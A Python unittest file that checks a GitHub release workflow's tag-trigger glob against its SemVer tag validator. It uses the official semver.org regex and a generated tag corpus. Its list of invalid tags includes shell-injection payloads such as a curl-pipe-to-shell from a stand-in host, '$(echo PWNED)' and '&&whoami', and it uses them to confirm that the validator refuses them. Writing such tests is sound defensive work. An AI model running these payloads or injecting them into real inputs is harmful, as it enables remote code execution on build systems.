"""The release trigger and the release tag validator must agree.

`.github/workflows/release.yml` filters tag pushes with a glob and then re-validates the tag
with `grep -Eq`. Those two have disagreed twice:

* the glob was `v*`, which also matched the floating major-version tag the published action
  uses (`ci@v1`), so re-pointing it started a release that then failed validation;
* the validator was `([-+][0-9A-Za-z.]+)?`, a SemVer subset that rejected legitimate
  `v1.2.3-rc-1` and `v1.2.3-rc.1+build.7`.

Both produce the same failure mode: a push that satisfies the trigger, starts a privileged
release run, and dies on validation. This test reads both out of the workflow and asserts
they cannot drift apart again.
"""
from __future__ import annotations

import re
import unittest
from pathlib import Path

WORKFLOW = Path(__file__).resolve().parents[1] / ".github/workflows/release.yml"

# Ground truth: the official regex published at semver.org. Hand-written example lists keep
# missing cases -- the first validator missed hyphens in prerelease identifiers, the second
# missed the rule that *numeric* prerelease identifiers may not have leading zeroes. So the
# workflow's pattern is cross-checked against the spec over a generated corpus instead.
OFFICIAL_SEMVER = re.compile(
    r"^(?:0|[1-9]\d*)\.(?:0|[1-9]\d*)\.(?:0|[1-9]\d*)"
    r"(?:-(?:(?:0|[1-9]\d*|\d*[a-zA-Z-][0-9a-zA-Z-]*)"
    r"(?:\.(?:0|[1-9]\d*|\d*[a-zA-Z-][0-9a-zA-Z-]*))*))?"
    r"(?:\+(?:[0-9a-zA-Z-]+(?:\.[0-9a-zA-Z-]+)*))?$"
)

_CORES = ["1.2.3", "0.0.4", "10.20.30", "0.0.0", "01.2.3", "1.02.3", "1.2.03"]
_PRES = ["", "-rc.1", "-rc-1", "-alpha", "-alpha.beta", "-0.3.7", "-0A", "-x.7.z.92",
         "-alpha.0valid", "-01", "-alpha.01", "-01.2", "-", "-.", "-alpha..1"]
_BUILDS = ["", "+build.7", "+build.01", "+21AF26D3-117B344092BD", "+", "+.", "+build..7"]


def _semver_corpus():
    """Every core x prerelease x build combination, with the spec's verdict for each."""
    for core in _CORES:
        for pre in _PRES:
            for build in _BUILDS:
                body = core + pre + build
                yield "v" + body, bool(OFFICIAL_SEMVER.match(body))


# Tags that are valid SemVer releases: the trigger should fire AND the validator accept.
VALID = [t for t, ok in _semver_corpus() if ok]
# Non-releases and shell-injection payloads a crafted workflow_dispatch input could supply.
# These are not SemVer at all, so they are listed rather than generated.
INVALID = [t for t, ok in _semver_corpus() if not ok] + [
    "v1", "v2", "v1.2", "vnext", "main", "master", "HEAD", "", "v", "1.2.3",
    "v1.2.3 ", " v1.2.3",
    'v0.6.0"; echo PWNED; "', "$(echo PWNED)", "v0.6.0; curl evil.sh|sh",
    "v1.2.3&&whoami", "v1.2.3`id`", "v1.2.3\nv9.9.9",
]


def _workflow_text() -> str:
    return WORKFLOW.read_text(encoding="utf-8")


def _trigger_globs() -> list[str]:
    """The `on.push.tags` globs, read straight out of the YAML (no yaml dependency)."""
    text = _workflow_text()
    block = re.search(r"^\s*tags:\s*$(.*?)^\s*workflow_dispatch:", text,
                      re.MULTILINE | re.DOTALL)
    assert block, "could not locate on.push.tags in release.yml"
    return re.findall(r'^\s*-\s*"([^"]+)"', block.group(1), re.MULTILINE)


def _validator_regex() -> str:
    """The ERE passed to `grep -Eq` in the tag-validation step."""
    m = re.search(r"grep -Eq '(\^v.*?)'", _workflow_text())
    assert m, "could not locate the grep -Eq tag validator in release.yml"
    return m.group(1)


def _glob_matches(glob: str, ref: str) -> bool:
    """GitHub ref filters: '*' matches any character except '/'."""
    rx = "^" + "".join("[^/]*" if c == "*" else re.escape(c) for c in glob) + "$"
    return re.match(rx, ref) is not None


def _triggers(ref: str) -> bool:
    return any(_glob_matches(g, ref) for g in _trigger_globs())


class TestReleaseTagPolicy(unittest.TestCase):
    def test_workflow_pieces_are_found(self):
        # Guard against the extraction silently returning nothing and passing vacuously.
        self.assertTrue(_trigger_globs(), "no tag globs extracted")
        self.assertTrue(_validator_regex().startswith("^v"), "no validator regex extracted")

    def test_corpus_is_non_trivial(self):
        # Both lists must be populated, or the assertions below pass vacuously.
        self.assertGreater(len(VALID), 50, "generated valid-tag corpus is suspiciously small")
        self.assertGreater(len(INVALID), 50, "generated invalid-tag corpus is suspiciously small")

    def test_validator_agrees_with_the_official_semver_regex(self):
        """The workflow's ERE must classify every generated tag exactly as the spec does.

        This is the assertion that catches what example lists miss. It found that
        '[0-9A-Za-z-]+' wrongly accepted v1.2.3-01 and v1.2.3-alpha.01: SemVer forbids
        leading zeroes in numeric prerelease identifiers, though not in build metadata.
        """
        rx = re.compile(_validator_regex())
        disagreements = [
            f"{tag} (spec={spec}, workflow={bool(rx.match(tag))})"
            for tag, spec in _semver_corpus() if bool(rx.match(tag)) != spec
        ]
        self.assertEqual(
            disagreements, [],
            f"validator disagrees with SemVer 2.0.0 on {len(disagreements)} tag(s):\n  "
            + "\n  ".join(disagreements[:20]),
        )

    def test_validator_accepts_every_valid_semver_tag(self):
        rx = re.compile(_validator_regex())
        rejected = [t for t in VALID if not rx.match(t)]
        self.assertEqual(rejected, [], f"validator rejects valid SemVer tags: {rejected}")

    def test_validator_rejects_non_releases_and_injection_payloads(self):
        rx = re.compile(_validator_regex())
        accepted = [t for t in INVALID if rx.match(t)]
        self.assertEqual(accepted, [], f"validator accepts tags it must refuse: {accepted}")

    def test_no_legitimate_tag_triggers_a_run_it_cannot_pass(self):
        """The invariant that broke twice.

        A push that satisfies the trigger, starts a privileged release run and then dies on
        validation is a red X on a legitimate action. Scoped to real SemVer tags on purpose:
        a malformed or hostile ref (``v01.2.3``, ``v1.2.3`id```) matching the glob and then
        being refused by the validator is defence in depth, not a disagreement.
        """
        rx = re.compile(_validator_regex())
        disagree = [t for t in VALID if _triggers(t) and not rx.match(t)]
        self.assertEqual(
            disagree, [],
            "these valid tags start a release run and then fail validation: " + repr(disagree),
        )

    def test_hostile_refs_matching_the_glob_are_still_refused(self):
        """The flip side: the glob is not a security boundary, the validator is."""
        rx = re.compile(_validator_regex())
        slipped = [t for t in INVALID if _triggers(t)]
        self.assertTrue(slipped, "expected some hostile refs to match the glob")
        still_accepted = [t for t in slipped if rx.match(t)]
        self.assertEqual(still_accepted, [],
                         f"hostile refs passed the validator: {still_accepted}")

    def test_trigger_still_fires_for_real_releases(self):
        """The narrowing must not have gone so far that releases stop happening."""
        missed = [t for t in VALID if not _triggers(t)]
        self.assertEqual(missed, [], f"trigger no longer fires for real releases: {missed}")

    def test_floating_major_version_tags_are_ignored(self):
        """`ci@v1` is re-pointed as routine action maintenance; it must not start a release."""
        for tag in ("v1", "v2", "v10"):
            self.assertFalse(_triggers(tag), f"{tag} must not trigger the release workflow")


if __name__ == "__main__":
    unittest.main()
